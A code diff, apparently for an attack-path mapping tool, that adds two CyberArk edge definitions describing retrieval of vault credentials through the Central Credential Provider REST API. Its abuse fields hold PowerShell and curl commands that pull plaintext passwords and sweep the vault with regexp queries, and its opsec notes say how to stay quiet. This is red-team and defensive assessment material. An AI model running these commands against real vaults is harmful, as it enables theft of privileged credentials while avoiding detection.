@@ -129,6 +129,68 @@ var EdgeInfoMap = map[string]EdgeInfo{
 			"https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/dualcontrolworkflow.htm",
 		},
 	},
+	"CyberArk_CanRetrieveViaCCP": {
+		Description: "The source CyberArk Application (AppID) is a member of the safe containing the target account with useAccounts and/or retrieveAccounts permission, " +
+			"and can therefore retrieve that account's credential through the Central Credential Provider (CCP / AIMWebService) REST API — typically with a single GET request and without any interactive PVWA login. " +
+			"The edge properties carry the application's authentication posture: appIsUnrestricted=true means the AppID has no Allowed Machines and no OS user / path / hash / certificate binding, " +
+			"so knowledge of the AppID alone is enough to pull the credential from anywhere that can reach the CCP endpoint. allowedMachines lists the IPs/hosts permitted to use the AppID (if any), " +
+			"and isDefaultCCPApp=true flags the out-of-the-box AIMWebService application, which usually has access to every safe. " +
+			"Tradecraft credit: Marat Nigmatullin (@_mnigma_, FalconForce) — \"4 GET requests = 3 Domain admins: CyberArk magic you didn't know about\", SO-CON 2026.",
+		WindowsAbuse: "Retrieve the credential directly from the CCP endpoint using the application's AppID. No PVWA token is required — only network access to the CCP server " +
+			"(and, if appIsUnrestricted=false, the request must originate from one of the allowedMachines / run as the permitted OS user / binary):\n\n" +
+			"$ccp = 'https://<CCP_Server>'\n" +
+			"# Exact lookup for a single account (CCP returns at most ONE match per request):\n" +
+			"Invoke-RestMethod -Uri \"$ccp/AIMWebService/api/Accounts?AppID=<AppID>&Safe=<safeName>&UserName=<userName>&Address=<address>\"\n\n" +
+			"# RegExp query to search/enumerate the vault one match at a time (QueryFormat=regexp):\n" +
+			"Invoke-RestMethod -Uri \"$ccp/AIMWebService/api/Accounts?AppID=<AppID>&QueryFormat=regexp&Query=username=adm\"\n" +
+			"Invoke-RestMethod -Uri \"$ccp/AIMWebService/api/Accounts?AppID=<AppID>&QueryFormat=regexp&Query=username=admin;Address=domain1.local\"\n\n" +
+			"# The default CCP application usually has access to ALL safes:\n" +
+			"Invoke-RestMethod -Uri \"$ccp/AIMWebService/api/Accounts?AppID=AIMWebService&QueryFormat=regexp&Query=username=domainadmin;Address=domain1.local\"\n\n" +
+			"The JSON response includes the plaintext 'Content' field (the password) plus account metadata.",
+		LinuxAbuse: "Pull the credential from the CCP REST API with curl (the response 'Content' field is the plaintext password):\n\n" +
+			"CCP='https://<CCP_Server>'\n" +
+			"# Exact, single-account retrieval:\n" +
+			"curl -s \"$CCP/AIMWebService/api/Accounts?AppID=<AppID>&Safe=<safeName>&UserName=<userName>&Address=<address>\"\n\n" +
+			"# RegExp enumeration (one match per request — iterate to sweep the vault):\n" +
+			"curl -s \"$CCP/AIMWebService/api/Accounts?AppID=<AppID>&QueryFormat=regexp&Query=username=adm\"\n" +
+			"curl -s \"$CCP/AIMWebService/api/Accounts?AppID=<AppID>&QueryFormat=regexp&Query=username=som[a-z]username[0-9];Address=hostname[a-z].local\"\n\n" +
+			"# Default AIMWebService AppID — most likely reads every safe:\n" +
+			"curl -s \"$CCP/AIMWebService/api/Accounts?AppID=AIMWebService&QueryFormat=regexp&Query=username=admin;Address=domain1.local\"\n\n" +
+			"# If a client certificate is required, supply it:\n" +
+			"curl -s --cert client.pem --key client.key \"$CCP/AIMWebService/api/Accounts?AppID=<AppID>&Query=Safe=<safeName>;UserName=<userName>\"",
+		OpsecNotes: "CCP credential requests are served outside the interactive PVWA workflow and are not subject to dual-control approval, so a successful retrieval will not raise an approval request. " +
+			"CCP usage is still recorded (the Provider writes to its local logs and CCP activity can be collected centrally), and credential retrievals appear in the Vault audit trail under the application identity. " +
+			"Because each request returns at most one match, RegExp vault sweeps generate a high volume of requests. " +
+			"Detection (per Nigmatullin, SO-CON 2026) keys on CCP responses such as \"Too many password objects\" or \"The Credential Provider has encountered an error\", which indicate brute-force / over-broad RegExp queries. " +
+			"Prefer Exact queries against known Safe/Object/UserName values to stay quiet; sweeping RegExp queries are noisy. " +
+			"CI/CD runners (GitLab, Azure DevOps, Bitbucket) that hold an AppID are a common foothold for reaching the CCP endpoint.",
+		References: []string{
+			"https://docs.cyberark.com/credential-providers/latest/en/content/ccp/calling-the-web-service-using-rest.htm",
+			"https://docs.cyberark.com/credential-providers/latest/en/content/ccp/the-central%20-credential-provider.htm",
+			"https://docs.cyberark.com/credential-providers/latest/en/content/ccp/api-ccp-usage.htm",
+			"https://github.com/SpecterOps/presentations/tree/main/SO-CON%202026",
+		},
+	},
+	"CyberArk_CCPAllowedFrom": {
+		Description: "The target Active Directory computer appears in the source CyberArk Application's Allowed Machines list — it is one of the hosts permitted to present this AppID to the Central Credential Provider (CCP / AIMWebService) endpoint. " +
+			"This is inferred by matching the Allowed Machines value to a computer name; IP-only entries (targetIsIP=true) will not resolve to a Computer node. " +
+			"When machineIsOnlyRestriction=true, the Allowed Machines binding is the AppID's ONLY authentication factor (no OS user / path / hash / certificate), so control of this host is sufficient to wield the AppID and retrieve every credential it can read via CCP. " +
+			"Tradecraft credit: Marat Nigmatullin (@_mnigma_, FalconForce) — \"4 GET requests = 3 Domain admins: CyberArk magic you didn't know about\", SO-CON 2026.",
+		WindowsAbuse: "From the allowed host, request the credential through the CCP endpoint — the request now originates from a permitted machine, satisfying the Allowed Machines restriction:\n\n" +
+			"$ccp = 'https://<CCP_Server>'\n" +
+			"Invoke-RestMethod -Uri \"$ccp/AIMWebService/api/Accounts?AppID=<AppID>&Safe=<safeName>&UserName=<userName>&Address=<address>\"\n\n" +
+			"# Then follow the application's CyberArk_CanRetrieveViaCCP edges to see exactly which accounts become reachable from here.",
+		LinuxAbuse: "From the allowed host, pull the credential via CCP (the response 'Content' field is the plaintext password):\n\n" +
+			"curl -s \"https://<CCP_Server>/AIMWebService/api/Accounts?AppID=<AppID>&Safe=<safeName>&UserName=<userName>&Address=<address>\"\n\n" +
+			"# If a client certificate is also required (machineIsOnlyRestriction=false), supply it with --cert/--key.",
+		OpsecNotes: "Issuing the request from an approved host is exactly the intended use of the AppID, so it blends in with legitimate CCP traffic. " +
+			"Retrievals are still recorded under the application identity and CCP usage can be collected centrally. " +
+			"If machineIsOnlyRestriction is false, the Allowed Machines check is only one of several factors and landing on this host alone will not yield credentials.",
+		References: []string{
+			"https://docs.cyberark.com/credential-providers/latest/en/content/ccp/calling-the-web-service-using-rest.htm",
+			"https://docs.cyberark.com/credential-providers/latest/en/content/cp%20and%20ascp/application-details.htm",
+		},
+	},
 	"CyberArk_MemberOf": {
 		Description: "The source CyberArk user or group is a member of the target CyberArk group. " +
 			"Group membership is cumulative: a user inherits all permissions granted to every group they belong to across all safes. " +
